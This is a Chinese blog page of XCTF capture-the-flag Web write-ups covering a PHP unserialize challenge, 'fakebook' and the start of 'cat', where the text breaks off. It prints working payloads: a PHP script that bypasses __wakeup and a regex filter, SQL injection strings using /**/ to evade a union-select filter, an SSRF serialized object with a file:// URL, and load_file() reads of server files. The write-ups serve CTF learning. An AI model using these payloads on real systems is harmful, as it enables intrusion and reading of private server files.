<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【XCTF】 Web进阶区 WriteUp 汇总 | sma11new</title><meta name="author" content="sma11new"><meta name="copyright" content="sma11new"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）一个反序列化题目，页面直接给出了源码： 123456789101112131415161718192021222324252627&amp;lt;?php class Demo &amp;amp;#123;     private $fil"><link rel="shortcut icon" href="/img/XiaoXin.png"><link rel="canonical" href="https://blog.sma11new.com/post/20200972133"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【XCTF】 Web进阶区 WriteUp 汇总',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2020-11-01 21:37:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/XiaoXin.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/background/xiaoxin/xiaoxin_pic7.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">sma11new</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【XCTF】 Web进阶区 WriteUp 汇总</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-07T13:33:40.000Z" title="发表于 2020-09-07 21:33:40">2020-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-01T13:37:40.000Z" title="更新于 2020-11-01 21:37:40">2020-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【XCTF】 Web进阶区 WriteUp 汇总"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="⭐-Web-php-unserialize（-wakeup-绕过-正则匹配绕过）"><a href="#⭐-Web-php-unserialize（-wakeup-绕过-正则匹配绕过）" class="headerlink" title="⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）"></a>⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）</h2><p>一个反序列化题目，页面直接给出了源码：</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p><strong>进行简单的审计</strong></p>
<p>先是创建了一个Demo类，类中定义私有属性$file为文件名，并初始化了三个魔术方法：</p>
<ul>
<li>__construct() 构造函数在实例化类时执行</li>
<li>__destruct() 析构函数在销毁对象时执行</li>
<li>__wakeup() 在反序列化前执行</li>
</ul>
<p>其中<code>__wakeup()</code>中给出flag文件的提示，但是如果执行该函数，则会强制将包含文件改为index.php，因此此处是一个过滤点，需要绕过。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570893.png" alt="1602570853115.png"></p>
<p>继续往下，一个if else子句语句，GET接收var参数并进行base64解码，然后<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>做过滤，其中正则表达式的含义是：匹配<strong>o:任意数字</strong>或<strong>c:任意数字</strong>，匹配到则终止程序，因此这里也许要绕过。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570808.png" alt="1602570787053.png"></p>
<p>总共有两个过滤点需要绕过，先编写代码对Demo类实例化对象进行序列化，得到如下结果： </p>
<pre><code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="attr">&quot;Demo&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="string">&quot;\00Demo\00file&quot;</span>;s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;fl4g.php&quot;</span>;<span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure>
</code></pre>
<p>(\00为手动添加，因为是私有属性，但是\00在页面不会显示，所以需要手动添加)</p>
<p>绕过方法：</p>
<ol>
<li>绕过执行&#x3D;&#x3D;__wakeup()&#x3D;&#x3D;魔术方法，根据之前做的题目，只需要将序列化后的Json串中的属性个数修改为大于真实属性个数即可绕过执行该魔术方法</li>
<li>绕过<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>对序列化的匹配，将O:4改为O:+4即可，因为+4等同于4</li>
</ol>
<p>所以，在源码的基础上，添加序列化以及字符替换的代码，并直接输出base64编码后的序列化结果，代码如下：</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:4&quot;</span>, <span class="string">&quot;O:+4&quot;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$se</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p>GET传递base64编码结果，得到flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569811.png" alt="1602427435111.png"></p>
<p>也可以在线编码，但是注意需要在Demo左右添加\00，因为私有属性private在序列化时会自动添加类名及\00不可打印符号，但是查看源码是可以发现的：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569824.png" alt="1602430789230.png"></p>
<p>所以在手动修改数据并base64时，需要添加\00<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569832.png" alt="1602430889005.png"></p>
<h2 id="⭐-fakebook（SSRF-SQL注入）"><a href="#⭐-fakebook（SSRF-SQL注入）" class="headerlink" title="⭐ fakebook（SSRF+SQL注入）"></a>⭐ fakebook（SSRF+SQL注入）</h2><p>4星难度的题目，从这道题开始明显感觉到有些吃力，能做出来得益于师傅们的wp文章。</p>
<p>首先扫描网站目录，发现存在flag.php文件，在robots.txt中发现了user.php.bak文件，访问该文件保存至本地，是php源码，进行代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过审计发现，在get函数中，第23行没有对传入的url，也就是用户指定的自己的Blog地址做安全校验，导致此处可能<strong>存在SSRF漏洞</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>然后在isValidBlog函数中，第41行对blog做了正则匹配，必须输入网址格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br></pre></td></tr></table></figure>

<p>已知可能存在SSRF，又有**isValidBlog()**函数过滤，但是不知道是在输入的时候过滤还是查询的时候同样过滤，如果是只在输入的时候过滤，那么只需要想办法将SSRF利用代码传入数据库，查询即可；如果是查询前过滤，那就得另寻他法了。</p>
<p>继续往下，在注册用户和查询用户信息参数处都存在SQL时间盲注，而且页面报错也爆出了网站根目录<code>/var/www/html/</code>直接SQLmap跑表</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386702.png" alt="1604157974568.png"></p>
<p>跑fakebook库的内容，发现存储的是注册用户的个人信息序列化结果</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386709.png" alt="1604158158876.png"></p>
<p>尝试利用SQLmap执行系统命令失败了，这就有另外一个可能的利用方式了，已知信息如下：</p>
<ul>
<li>存在SSRF，可能仅在注册时检查Blog URL的合法性</li>
<li>存在SQL注入</li>
<li>已知网站根目录和flag.php位置</li>
<li>数据库存储的是个人信息的序列化结果</li>
</ul>
<p>利用这些，可以尝试在查询用户数据信息时，将用户的Blog URL改为file协议读取<strong>flag.php</strong>文件的SSRF利用代码，构造序列化结果并通过SQL注入来完成查询，即可得到Flag（当然这也是读师傅们文章得到的启发~）</p>
<p>通过对参数n的SQL注入测试，得到有4个字段，用户blog数据在第四个字段，而且程序对<code>union select</code>有过滤，可以使用注释<code>/**/</code>替换空格的方式绕过</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386731.png" alt="1604161297056.png"></p>
<p>查看页面源码已经读出flag.php文件内容，只不过做了base64编码后放在了iframe标签中</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386745.png" alt="1604161517371.png"></p>
<p>对这串base64解码同样是就是flag.php文件的内容</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386755.png" alt="1604161465705.png"></p>
<p>看了师傅们的wp，得知还有另一种更为简单的，但其实道理是一样的，都是利用SQL注入，读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php文件，只不过此方法是将数据回显放在了其他字段，比如姓名西段，就不需要做序列化了</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0/**/union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>

<p>执行后查看源码即可得到Flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386764.png" alt="1604162503775.png"></p>
<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a><strong>总结一下</strong></h3><p>漏洞点：SSRF、SQL注入、报错信息泄露根目录，Web扫描得到关键路径</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42196196/article/details/81952174">https://blog.csdn.net/qq_42196196&#x2F;article&#x2F;details&#x2F;81952174</a></p>
<p><a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-2893815.html">http://www.mamicode.com/info-detail-2893815.html</a></p>
<h2 id="⭐-cat（Django宽字节报错-php-curl-读取文件）"><a href="#⭐-cat（Django宽字节报错-php-curl-读取文件）" class="headerlink" title="⭐ cat（Django宽字节报错+php curl @读取文件）"></a>⭐ cat（Django宽字节报错+php curl @读取文件）</h2><p>很难，几乎完全参考师傅们的wp做完的，大佬的思路真的野！😅</p>
<p>一个ping功能的系统，尝试管道符命令执行发现被过滤，FUZZ测试，发现url过滤处的没有对以下特殊字符进行过滤：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387393.png" alt="1604207185171.png"></p>
<p>测试发现后台使用的是GBK宽字符编码，可以通过修改url参数值为宽字符**%df**制造报错，发现后端是用Python的Django框架写的</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387401.png" alt="1604204281681 (1).png"></p>
<p>而且找到了ping函数的内容：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387409.png" alt="1604204491772 (1).png"></p>
<p>把代码拷到本地，整理一下，其实也很简单的逻辑，甚至不需要拷到本地</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@process_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="comment"># 转义</span></span><br><span class="line">	data = request.POST.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">	data = escape(data)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[a-zA-Z0-9\-\./]+$&#x27;</span>, data):</span><br><span class="line">		<span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid URL&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> HttpResponse(os.popen(<span class="string">&quot;ping -c 1 \&quot;%s\&quot;&quot;</span> % data).read())</span><br></pre></td></tr></table></figure>

<p>首先<code>escape()</code>函数对输入中的特殊字符进行转义，然后将转义结果放在<code>re.match()</code>中进行匹配过滤，匹配网址或ip的数据格式，最后使用<code>os.popen()</code>执行ping命令，得到并返回结果。</p>
